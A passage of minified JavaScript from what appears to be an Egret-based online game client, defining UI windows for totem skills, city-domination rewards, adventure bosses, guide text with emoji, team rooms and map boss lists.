T=r.GlobalConfig.TotemMainSkillConfig[G.group][1].skillId,M=r.GlobalConfig.SkillsConfig[T],L=r.GlobalConfig.SkillsDescConfig[M.desc];this.skillname0.text=gettext("{0}【集齐后激活】",L.name),this.skilldesc0.textFlow=n.TextFlowMaker.generateTextFlow(m.SkillUtil.getDesc(M,M.desc_ex)),this.skillname1.visible=!1,this.skilldesc1.visible=!1}else if(1==this.openType1){var F=i.qualityNum[1],S=y.TotemCT.ins().returnGropByJob(),O=y.TotemCT.ins().checkIsWearDone(this.configID,S)?2:1,N=1;2==O&&(O=y.TotemCT.ins().checkIsWearMax(this.configID,S,F)?3:2,N=y.TotemCT.ins().checkIsWearLevel(this.configID,S));var T=r.GlobalConfig.TotemMainSkillConfig[S][N].skillId,W=r.GlobalConfig.SkillsConfig[T],U=W.desc,x=r.GlobalConfig.SkillsDescConfig[U];switch(O){case 1:this.skillname0.text=gettext("【{0}{1}级】未激活",x.name,N),this.skilldesc0.textFlow=n.TextFlowMaker.generateTextFlow1(m.SkillUtil.getDesc(W,W.desc_ex)),this.skillname1.visible=!1,this.skilldesc1.visible=!1;break;case 2:this.skillname0.text=gettext("【{0}{1}级】",x.name,N),this.skilldesc0.textFlow=n.TextFlowMaker.generateTextFlow1(m.SkillUtil.getDesc(W,W.desc_ex)),T=null===(t=r.GlobalConfig.TotemMainSkillConfig[S][N+1])||void 0===t?void 0:t.skillId,T?(this.skillname1.visible=!0,this.skilldesc1.visible=!0,W=r.GlobalConfig.SkillsConfig[T],U=W.desc,x=r.GlobalConfig.SkillsDescConfig[U],this.skillname1.text=gettext("【{0}{1}级】",x.name,N+1),this.skilldesc1.textFlow=n.TextFlowMaker.generateTextFlow1(m.SkillUtil.getDesc(W,W.desc_ex))):(this.skillname1.visible=!1,this.skilldesc1.visible=!1);break;case 3:this.skillname0.text=gettext("【{0}{1}级】",x.name,N),this.skilldesc0.textFlow=n.TextFlowMaker.generateTextFlow1(m.SkillUtil.getDesc(W,W.desc_ex)),this.skillname1.visible=!1,this.skilldesc1.visible=!1}}}},e.prototype.removeAllExtGrop=function(){removeFromParent(this.eSupExtGroup),removeFromParent(this.skillGrp0)},e}(o.BaseView);e.TotemDetailedItem=C,window.TotemDetailedItem=C,__reflect(C.prototype,"TotemDetailedItem",[]),window.TotemDetailedItem=C},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GainGoodsItem=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="GainGoodsItemSkin",e.graycolor=7239022,e}return __extends(e,t),e.prototype.skinCom=function(){this.star=new ImageArray,this.stars.addChild(this.star),this.star.imgSource="star3",this.star.interval=6},e.prototype.dataChanged=function(){var t;t=isNaN(Number(this.data[0]))?this.data:this.data.slice(1),this.desc.text=t[0],this.star.imgNum=0},Object.defineProperty(e.prototype,"userData",{get:function(){return this.data},enumerable:!1,configurable:!0}),e}(n.BaseItemRender);e.GainGoodsItem=o,window.GainGoodsItem=o,__reflect(o.prototype,"GainGoodsItem",[]),window.GainGoodsItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DominateWorldCityDesc=void 0;var n=i(5),o=i(1),s=i(11),a=i(0),r=i(78),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DominateCityDescWinSkin",e.isBtn=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.WinAwardList.itemRenderer=s.ItemBase,this.WinAwardList.dataProvider=this.arc1=new eui.ArrayCollection,this.LoseAwardList.itemRenderer=s.ItemBase,this.LoseAwardList.dataProvider=this.arc2=new eui.ArrayCollection,this.WinDailyAwardList.itemRenderer=s.ItemBase,this.WinDailyAwardList.dataProvider=this.arc3=new eui.ArrayCollection,this.LoseDailyAwardList.itemRenderer=s.ItemBase,this.LoseDailyAwardList.dataProvider=this.arc4=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0],n=t[1];switch(this.datas=n,this.isBtn=!1,this.setDescByType(n),i){case 1:this.setNormalData(n);break;case 2:this.setSpeData(n)}this.addTouchEvent(this.createBtn,this.onTouchs),observe(this,this.updateBtn,r.DominateWorldCT.ins().updateAward)},e.prototype.removeDisplay=function(){this.skin&&(this.arc1.replaceAll([]),this.arc2.replaceAll([]),this.arc3.replaceAll([]),this.arc4.replaceAll([]),this.removeObserve(),this.removeTouchEvent(this.createBtn,this.onTouchs))},e.prototype.updateBtn=function(){this.datas.wins>0&&this.datas.worldId==r.DominateWorldCT.ins().myWorldId&&2==r.DominateWorldCT.ins().resultAward?this.createBtn.visible=!0:this.createBtn.visible=!1,r.DominateWorldCT.ins().fbSwitch?(this.createBtn.visible=!0,this.createBtn.label=gettext("进入战场")):this.createBtn.label=gettext("领 取")},e.prototype.onTouchs=function(t){switch(t.target){case this.createBtn:if(this.isBtn)return;this.isBtn=!0,r.DominateWorldCT.ins().fbSwitch?r.DominateWorldCT.ins().sendFbDominate():r.DominateWorldCT.ins().sendAwardDominate(),this.updateBtn()}},e.prototype.uptateBtn=function(){this.isBtn=!1},e.prototype.setDescByType=function(t){var e=a.GlobalConfig.DominationBtCfg[t.type];e&&(this.strategyL.textFlow=n.TextFlowMaker.generateTextFlow1(e.showinfo),this.setIcon.source=e.showmap)},e.prototype.setNormalData=function(t){this.cityName.text=t.cityName||gettext("无");var e=a.GlobalConfig.DominationBtLvCfg[t.lv];e&&(this.arc1.replaceAll(e.win.concat()),this.arc2.replaceAll(e.lose.concat()),this.arc3.replaceAll(e.dailyWin.concat()),this.arc4.replaceAll(e.dailyLose.concat())),this.createBtn.visible=!1},e.prototype.setSpeData=function(t){this.cityName.text=t.cityName;var e=a.GlobalConfig.DominationBtLvCfg[t.lv];e&&(this.arc1.replaceAll(e.win.concat()),this.arc2.replaceAll(e.lose.concat()),this.arc3.replaceAll(e.dailyWin.concat()),this.arc4.replaceAll(e.dailyLose.concat()),t.wins>0&&t.worldId==r.DominateWorldCT.ins().myWorldId&&2==r.DominateWorldCT.ins().resultAward?this.createBtn.visible=!0:this.createBtn.visible=!1,r.DominateWorldCT.ins().fbSwitch?(this.createBtn.visible=!0,this.createBtn.label=gettext("进入战场")):this.createBtn.label=gettext("领 取"))},__decorate([delayCall(1e3)],e.prototype,"uptateBtn",null),e}(o.BaseView);e.DominateWorldCityDesc=l,window.DominateWorldCityDesc=l,__reflect(l.prototype,"DominateWorldCityDesc",[]),window.DominateWorldCityDesc=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.QiyuBossWin=void 0;var n=i(8),o=i(1),s=i(0),a=i(4),r=i(6),l=i(76),h=i(23),u=i(7),p=i(35),d=i(2),c=i(27),f=i(334),g=i(697),m=function(t){function e(){var e=t.call(this)||this;return e._sn_="FortuitousBossSkin",e._bossIsEnd=!1,e._tweenInfoArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this._hurtRankArr=new eui.ArrayCollection,this.list_rank.itemRenderer=f.QiyuBossHurtRankItem,this.list_rank.dataProvider=this._hurtRankArr,this.addTouchEvent(this.closeBtn,this.onClick),this.addTouchEvent(this.btnHelp2,this.onClick),this.addTouchEvent(this.btnFight,this.onClick),this.addTouchEvent(this.btnRewardShow,this.onClick),this.eBloodBar.slideDuration=0,this.eBloodBar.maximum=100,this.eBloodBar.value=0,this.eBloodBar.labelDisplay.text="",this.eBloodBar.labelDisplay.visible=!1},e.prototype.onClick=function(t){var e,i;switch(t.target){case this.closeBtn:win.close(this);break;case this.btnHelp2:win.open(l.CommonHelpWin,(null===(e=s.GlobalConfig.HelpInfoConfig[323])||void 0===e?void 0:e.text)||"");break;case this.btnFight:this.toFight();break;case this.btnRewardShow:win.open(g.QiyuBossReachRewardWin,(null===(i=this._bossInfo)||void 0===i?void 0:i.qiyuBossCfgId)||1)}},e.prototype.toFight=function(){if(this._hasAtkTimes){if(this._bossIsEnd)return void d.TipsCT.ins().showTips(gettext("boss已逃跑"));h.GameLogic.ins().closeChangeSceneBar(),p.TaskCT.ins().reqJoinQiyuBoss()}else{if(!this._bossInfo||!this._qiyuBossCfg)return;if(this._bossIsEnd)return void d.TipsCT.ins().showTips(gettext("boss已逃跑"));var t=this._bossInfo.buyTimes||0,e=p.TaskCT.ins().getMaxBuyCnt(this._bossInfo.qiyuBossCfgId);if(t>=e)return void d.TipsCT.ins().showTips(gettext("没有购买次数了"));var i=this._qiyuBossCfg.buyCosts[t+1];if(i){var n=[];if(0==i.type&&1==i.id)n.push("mainui_tq");else if(0==i.type&&2==i.id)n.push("szyuanbao");else{var o=s.GlobalConfig.ItemConfig[i.id];o&&n.push(RES_DIR_ITEMICON+o.icon+".png")}var a=e>t?3014400:16711680,l=[gettext("是否花费"),i.count+"",gettext("购买1次次数。剩余可购买次数|C:{0}&T:（{1}/{2}）|",a,e-t,e)];c.WarnWin.show3(l,n,function(){r.BagCT.ins().isConsumeEnough(i,r.BagCT.BAG_TYPE_OTHTER,!0)&&p.TaskCT.ins().reqByQiyuBossTimes()},this)}}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(p.TaskCT.ins().postQiyuBossRankInfo,this.flusHurtRankList),this.observe(p.TaskCT.ins().postQiyuBossSyncInfo,this.flusJieDuan),this.observe(p.TaskCT.ins().postQiyuBossIfo,this.flusSomeInfo),this.observe(p.TaskCT.ins().postQiyuBossIfo1,this.showTweenEff),this.flusSomeInfo(),p.TaskCT.ins().reqQiyuBossInfo(),p.TaskCT.ins().reqQiyuBossHurtRank(),this.flusHurtRankList()},e.prototype.flusSomeInfo=function(){this._bossInfo=p.TaskCT.ins().qiyuBossInfo,this.flusBaseInfo(),this.flusJieDuan(),this.flusLeftTime()},e.prototype.flusBaseInfo=function(){if(this._bossInfo){var t=this._bossInfo.qiyuBossCfgId;if(this._qiyuBossCfg=s.GlobalConfig.AdventureBossConfig[t],!this._qiyuBossCfg)return;this._monCfg=s.GlobalConfig.MonstersConfig[this._qiyuBossCfg.bid],this.bossImg.source=this._qiyuBossCfg.bossImg+"_png";var e=this._qiyuBossCfg.freeCnt,i=a.ActorCC.actorID==this._bossInfo.touchoffPlayerId?s.GlobalConfig.AdventureBaseConfig.addCount:0,n=Math.max(this._qiyuBossCfg.freeCnt+this._bossInfo.buyTimes+i-this._bossInfo.ackTimes,0);this._hasAtkTimes=n>0,this.btnFight.label=this._hasAtkTimes?gettext("战斗"):gettext("购买次数"),this.txtAtkTimes.text=n+"/"+e,this.txtAtkTimes.textColor=this._hasAtkTimes?3014400:16711680}},e.prototype.flusLeftTime=function(){if(this._bossInfo){var t=this._bossInfo.qiyuBossEndTime-u.GameServerCC.serverTime;this.refreshTime.text=n.DateUtils.getFormatBySecond(t/1e3,n.DateUtils.TIME_FORMAT_1),0>=t?(Timer.stop(this.flusLeftTime,this),this.refreshTime.text=gettext("已逃跑"),this._bossIsEnd=!0):(this._bossIsEnd=!1,Timer.has(this.flusLeftTime,this)||Timer.start(1e3,-1,this.flusLeftTime,this))}},e.prototype.flusJieDuan=function(){if(this._bossInfo&&this.eBloodBar){this.eBloodBar.labelDisplay.visible=!0;var t=p.TaskCT.ins().getQiyuBossJieProgress(this._bossInfo.qiyuBossCfgId,this._bossInfo.allHurt),e=t.curPro,i=t.maxPro,n=t.cfg;if(1==n.idx){this.eBloodBar.maximum=i,this.eBloodBar.value=e,this.eBloodBar.labelDisplay.text=e+"/"+i;var o=RES_DIR_ITEMICON+n.boxIcon+".png";this.btnRewardShow.icon=o}else this.showTweenEff(n);this.txtJieDesc.text=gettext("当前达到 {0} 阶奖励",t.index)}},e.prototype.showTweenEff=function(t){for(var e=t.id,i=[],n=t.idx,o=1e3/n,a=1;a<=t.idx;a++)i.push(s.GlobalConfig.AdventureBossDamageConfig[e][a]);var r=0,l=0;if(this._bossInfo.allHurt>t.damage){var h=s.GlobalConfig.AdventureBossDamageConfig[e][t.idx+1];h&&(r=this._bossInfo.allHurt,l=h.damage)}this._tweenInfoArr=[];for(var a=0,u=i.length;u>a;a++){var p=0,d=0;0==a?(p=0,d=i[a].damage):(p=0,d=i[a].damage),this._tweenInfoArr.push({min:p,max:d,time:o,cfg:i[a],cur:d})}r>0&&this._tweenInfoArr.push({min:0,max:l,time:o,cfg:t,cur:r}),Timer.has(this.doTween,this)||Timer.start(o,-1,this.doTween,this)},e.prototype.doTween=function(){if(this._tweenInfoArr.length<=0)return void Timer.stop(this.doTween,this);var t=this._tweenInfoArr.shift(),e=t.min,i=t.max,n=t.time,o=t.cfg,s=t.cur;this.eBloodBar.maximum=i,this.eBloodBar.value=e;var a=egret.Tween.get(this.eBloodBar);a.to({value:s},n).wait(0).call(this.flusBoxIcon,this,[o])},e.prototype.flusBoxIcon=function(t){var e=t;if(e){var i=RES_DIR_ITEMICON+e.boxIcon+".png";this.btnRewardShow.icon=i}},e.prototype.flusHurtRankList=function(){var t=p.TaskCT.ins().qiyuBossHurtRankList;if(!t||0==t.length){t=[];for(var e=0;4>e;e++)t.push({rank:e+1,actorId:0,actorName:gettext("未上榜"),hurt:0})}this._hurtRankArr.replaceAll(t)},e.prototype.removeDisplay=function(){Timer.stop(this.flusLeftTime,this),egret.Tween.removeTweens(this.eBloodBar)},e}(o.BaseView);e.QiyuBossWin=m,window.QiyuBossWin=m,__reflect(m.prototype,"QiyuBossWin",[]),window.QiyuBossWin=m},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EmojiAlign=e.GonglueItem=e.GongLueText=void 0;var n=i(5),o=i(157),s=i(16),a=i(0),r=i(1),l=i(11),h=function(t){function e(e){var i=t.call(this)||this;return i.curHight=0,i._autoWrapLine=!0,i._emojiAlignment=p.CENTER,i.SPACEING_E=.275,i.EMOJI_INTERVAL=3,i.EMOJI_SPACEING=" ",i.emojiArr={},i.msgTxt=new eui.Label,i.msgTxt.x=0,i.msgTxt.y=0,i.msgTxt.lineSpacing=6,i.msgTxt.size=22,i.msgTxt.width=620,i.msgTxt.verticalAlign="top",getLangType()==LanguageEnum.AR&&(i.msgTxt.textAlign="right"),i.addChild(i.msgTxt),e&&i.addEventListener(egret.Event.ADDED_TO_STAGE,i.onAddToStage,i),i}return __extends(e,t),e.prototype.onAddToStage=function(t){this.removeEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.onRemoveFromStage,this)},e.prototype.onRemoveFromStage=function(){this.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.onAddToStage,this),this.addEventListener(egret.Event.ADDED_TO_STAGE,this.onAddToStage,this),this.reset()},Object.defineProperty(e.prototype,"richText",{set:function(t){if(this.reset(),t){var e=this.splitFace(t);if(!e.emojis)return void(-1!=e.msgs[0].indexOf("<a")&&-1!=e.msgs[0].indexOf("</a>")?this.msgTxt.textFlow=(new egret.HtmlTextParser).parse(e.msgs[0]):this.msgTxt.textFlow=n.TextFlowMaker.generateTextFlow1(t));for(var i=e.msgs.length,o="        ",s=0;i>s;s++)-1!=e.msgs[s].indexOf("<a")&&-1!=e.msgs[s].indexOf("</a>")?o+=e.msgs[s]:this.appendText(e.msgs[s]),e.emojis[s]&&this.insertEmoji(e.emojis[s]);-1!=o.indexOf("<a")&&-1!=o.indexOf("</a>")&&(this.msgTxt.textFlow=(new egret.HtmlTextParser).parse(o))}},enumerable:!1,configurable:!0}),e.prototype.insertEmoji=function(t){var e=t.replace(o.RegExpUtil.GONG_LUE_ITEMID,"");this.emojiW=95,this.emojiH=95;var i=this.addEmoji(e);this.emojiArr[i.hashCode]=i},e.prototype.addEmoji=function(t){var e=ObjectPool.pop("GonglueItem");e.setData(Number(t)),this.addChild(e);var i=this.msgTxt.$getLinesArr()||this.msgTxt.$getLinesArr2(),n=this.msgTxt.numLines||(i?i.length:0),o=n>0&&i&&i[n-1]?i[n-1].width||0:0;this._autoWrapLine?(o+this.emojiW>this.msgTxt.width?(this.appendText("\n"),e.x=0):e.x=o+this.EMOJI_INTERVAL,e.y=this.getEmojiY()):(e.x=o+this.EMOJI_INTERVAL,e.y=this.getEmojiY()),this.curHight=this.curHight>e.y+this.emojiH?this.curHight:e.y+this.emojiH;for(var s="",a=0,r=this.SPACEING_E*this.msgTxt.size;this.emojiW>r*a;)s+=this.EMOJI_SPACEING,a++;return this.appendText(s),e},Object.defineProperty(e.prototype,"autoWrapLine",{set:function(t){this._autoWrapLine=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"emojiAlignment",{set:function(t){this._emojiAlignment=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"textColor",{set:function(t){this.msgTxt.textColor=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"size",{set:function(t){this.msgTxt.size=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"textWidth",{set:function(t){this.width=t,this.msgTxt.width=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"textheight",{set:function(t){this.height=t,this.msgTxt.height=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"lineSpacing",{set:function(t){this.msgTxt.lineSpacing=t},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"uHeight",{get:function(){return this.curHight>this.msgTxt.textHeight?this.curHight:this.msgTxt.textHeight},enumerable:!1,configurable:!0}),e.prototype.reset=function(){this.curHight=20,this.msgTxt.text="",this.removeAllEmoji()},e.prototype.removeAllEmoji=function(){for(var t in this.emojiArr){var e=this.emojiArr[t];s.DisplayUtils.removeFromParent(e),ObjectPool.push(e)}this.emojiArr={}},e.prototype.getEmojiInfo=function(t){return a.GlobalConfig.ChatEmojiConfig[t]?a.GlobalConfig.ChatEmojiConfig[t]:null},e.prototype.appendText=function(t){this.msgTxt.textFlow=this.msgTxt.textFlow.concat(n.TextFlowMaker.generateTextFlow1(t))},e.prototype.getEmojiY=function(){for(var t=this.msgTxt.y,e=this.msgTxt.$getLinesArr()||this.msgTxt.$getLinesArr2(),i=this.msgTxt.numLines||(e?e.length:0),n=0;i>n;n++)n>0&&(t+=e[n].height+this.msgTxt.lineSpacing);switch(this._emojiAlignment){case p.UP:return t;case p.CENTER:return t-(this.emojiH-this.msgTxt.size>>1);case p.DOWN:return t-(this.emojiH-this.msgTxt.size);default:return t-(this.emojiH-this.msgTxt.size>>1)}},e.prototype.splitFace=function(t){return{emojis:t.match(o.RegExpUtil.GONG_LUE),msgs:t.split(o.RegExpUtil.GONG_LUE)}},e.EMOJI_MAX_ID=36,e.MAX_ID=100,e}(r.BaseView);e.GongLueText=h,window.GongLueText=h,__reflect(h.prototype,"GongLueText",[]);var u=function(t){function e(){return t.call(this)||this}return __extends(e,t),e.prototype.setData=function(t){this.gonglueItem||(this.gonglueItem=new l.ItemBase,this.addChild(this.gonglueItem)),this.gonglueItem.data=t},e.prototype.reset=function(){this.gonglueItem?this.gonglueItem.data="":this.emojiMc&&this.emojiMc.stop()},e.prototype.dispose=function(){this.reset(),this.emojiMc&&s.DisplayUtils.removeFromParent(this.emojiMc)},e}(r.BaseView);e.GonglueItem=u,window.GonglueItem=u,__reflect(u.prototype,"GonglueItem",[]),window.GonglueItem=u;var p;!function(t){t[t.UP=1]="UP",t[t.CENTER=2]="CENTER",t[t.DOWN=3]="DOWN"}(p=e.EmojiAlign||(e.EmojiAlign={})),window.EmojiAlign=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.InvadeTeamRoomWin=void 0;var n=i(45),o=i(148),s=i(1),a=i(138),r=i(82),l=i(2),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;
return e._sn_="InvadeFbRoomSkin",e.defaultRect=!1,e._memberArr=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this._memberArr=[this.leader,this.member1,this.member2]},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(r.InvadeCT.ins().postInvadeTeamUpdate,this.update),this.observe(n.ChatCT.ins().postSysChatMsg,this.updateChatList),this.observe(n.ChatCT.ins().postNewChatMsg,this.updateChatList),this.observe(n.ChatCT.ins().postDelMsg,this.updateChatList),this.chatList.itemRenderer=a.ChatListItemRenderer3,this._charInfoArr=new eui.ArrayCollection,this.chatList.dataProvider=this._charInfoArr,this.addTouchEvent(this,this.onTouch),this.update(),this.updateChatList(),r.InvadeCT.ins().invadeTeamDatas.length&&r.InvadeCT.ins().sendTeamInfo()},e.prototype.updateChatList=function(){this._charInfoArr.replaceAll(n.ChatCT.ins().chatListTip2.concat()),this.scr.height=this.chatGroup.height,this.refushBar()},e.prototype.refushBar=function(){Timer.start(100,1,this.refushBarList,this)},e.prototype.refushBarList=function(){0!=this.scr.viewport.contentHeight&&(this.scr.viewport.validateNow(),this.scr.viewport.contentHeight>this.scr.height&&(this.scr.viewport.scrollV=this.scr.viewport.contentHeight-this.scr.height))},e.prototype.update=function(){var t=r.InvadeCT.ins().invadeTeamDatas,e=[null,null,null];if(t&&t.length>0)for(var i=0,n=0,o=t.length;o>n;n++)1==t[n].isLeader?e[0]=t[n]:(i++,e[i]=t[n]);for(var n=0,o=this._memberArr.length;o>n;n++)this._memberArr[n].data=e[n];this.leader.visible=!0,this.scr.height=this.eGroup.height,this.refushBarList(),r.InvadeCT.ins().invadeTeamDatas.length?r.InvadeCT.ins().checkMeIsLeader()?this.btnExit.label=gettext("解散队伍"):this.btnExit.label=gettext("退出队伍"):this.btnExit.label=gettext("创建队伍")},e.prototype.onTouch=function(t){switch(t.target){case this.btnExit:r.InvadeCT.ins().invadeTeamDatas.length?r.InvadeCT.ins().checkMeIsLeader()?(r.InvadeCT.ins().sendQuitTeam(),win.close(this)):r.InvadeCT.ins().invadeTeamBaseId?l.TipsCT.ins().showTips(gettext("已经报名无法退出队伍")):(r.InvadeCT.ins().sendQuitTeam(),win.close(this)):r.InvadeCT.ins().sendCreateTeam();break;case this.eChat:win.open(o.ChatWin);break;case this.eCloss:win.close(this)}},e.prototype.removeDisplay=function(){Timer.stop(this.refushBarList,this),this.skin&&this.removeObserve()},e}(s.BaseView);e.InvadeTeamRoomWin=h,window.InvadeTeamRoomWin=h,__reflect(h.prototype,"InvadeTeamRoomWin",[]),window.InvadeTeamRoomWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TeamFuBenRoleVo=void 0;var n=i(32),o=function(){function t(){}return t.prototype.parse=function(t){this.roleID=t.readInt(),this.position=t.readByte(),this.roleName=t.readString(),this.job=t.readByte(),n.FbCT.ins().isNormal&&(this.sex=t.readByte()),n.FbCT.ins().isNormal&&(this.zs=t.readInt()),this.lv=t.readInt(),this.title=t.readInt(),this.outward=t.readInt(),n.FbCT.ins().isNormal&&(this.power=t.readDouble())},t}();e.TeamFuBenRoleVo=o,window.TeamFuBenRoleVo=o,__reflect(o.prototype,"TeamFuBenRoleVo",[]),window.TeamFuBenRoleVo=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ZhanChangMainView=void 0;var n=i(1),o=i(17),s=i(68),a=i(109),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.oneLevelWin=!0,e._sn_="ZhanChangMainSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0]||0;this.eVs.selectedIndex=i,observe(this,this.updateTabRp,o.RedPointBaseSys.ins().RpChange),observe(this,this.updateTabRp,s.CrossDartCarCT.ins().postRedChange),observe(this,this.updateTabRp,a.HegemonyRedPoint.ins().postRedPoint),this.tabRp()},e.prototype.removeDisplay=function(){},e.prototype.updateTabRp=function(){this.eTab.updateReds()},e.prototype.tabRp=function(){return!0},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return!0},e}(n.BaseView);e.ZhanChangMainView=r,window.ZhanChangMainView=r,__reflect(r.prototype,"ZhanChangMainView",[]),window.ZhanChangMainView=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Act62HouseWin=void 0;var n=i(1),o=i(11),s=i(9),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="osa62p1houseskin",e.layer=LayoutNum.top,e._actId=null,e}return __extends(e,t),e.prototype.addDisplay=function(t){this._actId=t;var e=s.Activity.ins().getActivityDataById(t);this.listItem.itemRenderer=o.ItemBase,this.listItem.dataProvider=new eui.ArrayCollection(e.getRewards()),this.buyAllQuChu.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this)},e.prototype.onClick=function(t){switch(t.currentTarget){case this.buyAllQuChu:s.Activity.ins().sendReward(this._actId,3),win.close(e)}},e}(n.BaseView);e.Act62HouseWin=a,window.Act62HouseWin=a,__reflect(a.prototype,"Act62HouseWin",[]),window.Act62HouseWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainMapBoss=void 0;var n=i(1),o=i(0),s=i(15),a=i(43),r=i(23),l=i(12),h=i(114),u=i(102),p=i(2),d=i(64),c=i(347),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.defaultRect=!1,e._sn_="mainMapBossSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.bossList.itemRenderer=c.MainMapBossItem,this.bossList.dataProvider=this.bossArr=new eui.ArrayCollection,this.bossList2.itemRenderer=c.MainMapBossItem2,this.bossList2.dataProvider=this.bossArr2=new eui.ArrayCollection,u.KFServerSys.ins()||u.KFServerSys.ins()},e.prototype.addDisplay=function(){observe(this,this.updateList,a.CityCC.ins().postMapBossList),observe(this,this.updateList2,h.KFBossSys.ins().doBossList),observe(this,this.updateItem,r.GameLogic.ins().doKfCost),this.addTouchEvent(this.close,this.onClick),this.addTouchEvent(this.helpBtn,this.onClick),this.addTouchEvent(this.helpBtn0,this.onClick),this.addTouchEvent(this.go,this.onClick),this.eTab.addEventListener(eui.UIEvent.CHANGE,this.CHANGE,this),this.eTab.addEventListener(eui.UIEvent.CHANGING,this.CHANGING,this),h.KFBossSys.ins().sendBossInfo(),this.initList(),this.updateItem()},e.prototype.removeDisplay=function(){if(this.skin)for(var t=0;t<this.bossList.numElements;t++){var e=this.bossList.getElementAt(t);e&&e.timeFun&&Timer.stop(e.timeFun,e)}},e.prototype.onClick=function(t){var e,i;switch(t.target){case this.close:d.MainUICC.onClickMap(!1);break;case this.helpBtn:win.open("CommonHelpWin",(null===(e=o.GlobalConfig.HelpInfoConfig[7])||void 0===e?void 0:e.text)||"");break;case this.helpBtn0:win.open("CommonHelpWin",(null===(i=o.GlobalConfig.HelpInfoConfig[9])||void 0===i?void 0:i.text)||"");break;case this.go:a.CityCC.ins().sendCityGo(1,4201)}},e.setTabIdx=function(t,i){if(void 0===i&&(i=!1),2==t){var n=l.OpenSystem.ins().checkSysOpen(s.SystemType.WoLongShanZhuang);if(!n)return i&&p.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(s.SystemType.WoLongShanZhuang)),!1}else if(3==t){var n=l.OpenSystem.ins().checkSysOpen(s.SystemType.MaYaShenDian);if(!n)return i&&p.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(s.SystemType.MaYaShenDian)),!1}return e.selectTab=t,!0},e.prototype.CHANGE=function(t){e.selectTab=this.eTab.selectedIndex,this.initList()},e.prototype.CHANGING=function(t){if(2==this.eTab.selectedIndex){var e=l.OpenSystem.ins().checkSysOpen(s.SystemType.WoLongShanZhuang);e||(p.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(s.SystemType.WoLongShanZhuang)),t.preventDefault())}if(3==this.eTab.selectedIndex){var e=l.OpenSystem.ins().checkSysOpen(s.SystemType.MaYaShenDian);e||(p.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(s.SystemType.MaYaShenDian)),t.preventDefault())}},e.prototype.initList=function(){var t=[];if(this.eTab.selectedIndex=e.selectTab,3==this.eTab.selectedIndex){this.showOrHide(!1);for(var i in h.KFBossSys.ins().kfBossList){var n=o.GlobalConfig.WoLongCrossBossConfig[i];n&&t.push(n)}return void this.bossArr2.replaceAll(t)}2==this.eTab.selectedIndex?(this.bossScroll.top=99,this.grp4.visible=!0):(this.eStateTxt.text=4==this.eTab.selectedIndex?gettext("新增城镇功能"):gettext("刷新状态"),this.bossScroll.top=40,this.grp4.visible=!1),this.showOrHide(!0);var s=this.eTab.selectedIndex+1;t=d.MainUICC.getMapBossList(s)||[],this.bossArr.replaceAll(t),this.bossArr.refresh()},e.prototype.updateList=function(){var t=d.MainUICC.getMapBossList(this.eTab.selectedIndex+1)||[];this.bossArr.replaceAll(t)},e.prototype.updateList2=function(){if(3==this.eTab.selectedIndex){var t=[];for(var e in h.KFBossSys.ins().kfBossList){var i=o.GlobalConfig.WoLongCrossBossConfig[e];i&&t.push(i)}this.bossArr2.replaceAll(t)}},e.prototype.showOrHide=function(t){this.grp1.visible=t,this.grp2.visible=!t},e.prototype.updateItem=function(){var t,e;this.hasItemLab.text=gettext("讨伐令: {0}/{1}",r.GameLogic.ins().kfCost,(null===(t=o.GlobalConfig.CrusadeConfig)||void 0===t?void 0:t.addMax)||0),this.hasItemLab0.text=gettext("讨伐令: {0}/{1}",r.GameLogic.ins().kfCost,(null===(e=o.GlobalConfig.CrusadeConfig)||void 0===e?void 0:e.addMax)||0)},e.selectTab=0,e}(n.BaseView);e.MainMapBoss=f,window.MainMapBoss=f,__reflect(f.prototype,"MainMapBoss",[]),window.MainMapBoss=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ActivityType38Data=void 0;var n=i(8),o=i(7),s=i(9),a=i(33),r=function(t){function e(e){var 